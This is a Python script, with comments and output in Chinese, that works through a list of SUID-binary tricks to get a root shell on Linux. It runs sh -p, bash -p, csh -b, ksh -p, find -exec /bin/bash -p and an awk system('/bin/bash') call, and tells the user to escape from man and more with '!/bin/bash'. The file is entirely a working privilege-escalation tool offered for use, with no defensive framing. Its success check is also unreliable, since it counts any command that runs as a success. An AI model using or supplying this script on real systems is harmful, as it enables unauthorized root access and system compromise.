import os
import subprocess
import sys

def try_command(description, command):
    """尝试执行命令并捕获错误"""
    print(f"[*] 尝试: {description}")
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        print(f"[+] 成功: {result.stdout}")
        return True
    except Exception as e:
        print(f"[-] 失败: {description} - {str(e)}")
        return False

def try_os_system():
    """尝试使用 os.system 调用 /bin/sh -p"""
    description = "使用 os.system 调用 sh -p"
    command = "/bin/sh -p"
    print(f"[*] 尝试: {description}")
    try:
        result = os.system(command)
        if result == 0:
            print(f"[+] 成功: {description}")
            return True
        else:
            print(f"[-] 失败: {description} - 返回码 {result}")
            return False
    except Exception as e:
        print(f"[-] 失败: {description} - {str(e)}")
        return False

def main():
    # 首先尝试 os.system("/bin/sh -p")
    if try_os_system():
        print("[+] 已成功获取 root shell，退出脚本。")
        sys.exit(0)

    # 其他 SUID 二进制文件命令
    suid_methods = [
        ("bash -p", "/usr/bin/bash -p"),
        ("sh -p", "/usr/bin/sh -p"),
        ("csh -b", "/usr/bin/csh -b"),
        ("ksh -p", "/usr/bin/ksh -p"),
        ("zsh", "/usr/bin/zsh"),
        ("find 执行 bash", "find /etc/passwd -exec /bin/bash -p \\;"),
        ("awk 执行 bash", "awk 'BEGIN {system(\"/bin/bash\")}'"),
        ("man 执行 bash", "man man"),  # 需要交互
        ("more 执行 bash", "more /etc/passwd")  # 需要交互
    ]

    print("[*] 开始尝试其他 SUID 二进制文件获取 root shell...")

    for description, cmd in suid_methods:
        if "man" in description or "more" in description:
            print(f"[*] 注意: {description} 需要交互模式，运行后请手动输入 '!/bin/bash'。")
            print(f"[*] 运行命令: {cmd}")
            try:
                subprocess.run(cmd, shell=True)
            except Exception as e:
                print(f"[-] 失败: {description} - {str(e)}")
        else:
            if try_command(description, cmd):
                print("[+] 已成功获取 root shell，退出脚本。")
                sys.exit(0)

    print("[-] 所有方法均失败，请检查 SUID 权限或系统配置。")

if __name__ == "__main__":
    main()
